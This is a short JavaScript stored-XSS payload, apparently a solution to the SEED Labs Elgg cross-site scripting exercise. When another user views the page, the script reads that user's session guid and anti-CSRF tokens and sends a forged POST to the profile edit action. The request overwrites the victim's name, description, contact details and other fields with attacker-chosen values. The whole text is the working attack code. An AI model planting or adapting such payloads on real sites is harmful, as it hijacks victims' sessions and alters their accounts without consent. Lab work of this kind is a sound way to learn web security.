<script type="text/javascript">
    window.onload = function () {
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var user_guid = elgg.session.user.guid;
    var page_owner_guid = elgg.page_owner.guid;

    //Construct the content of your url.
    var sendurl = "	http://www.seed-server.com/action/profile/edit"; //FILL IN
    var content = ts + token + "&guid=" + user_guid + "&name=xcajjdsa" + "&description=1905098" + "&accesslevel[description]=1" + "&briefdescription=1905098" + "&accesslevel[briefdescription]=1" + "&location=qwwer" + "&accesslevel[location]=1" + "& interests=qwert" + "& accesslevel[interests]=1" + "&skills=qwert" + "& accesslevel[skills]=1" + "&contactemail=abcd@gmail.com" + "&accesslevel[contactemail]=1" + "&phone=01232" + "&accesslevel[phone]=1" + "& mobile=01123" + "&accesslevel[mobile]=1" + "&website=https://abcd.com" + "&accesslevel[website]=1" + "&twitter=abcd" + "&accesslevel[twitter]=1";

    ; //FILL IN




    if (user_guid != page_owner_guid) {
            //Create and send Ajax request to modify profile
            var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);
        }
    }
</script>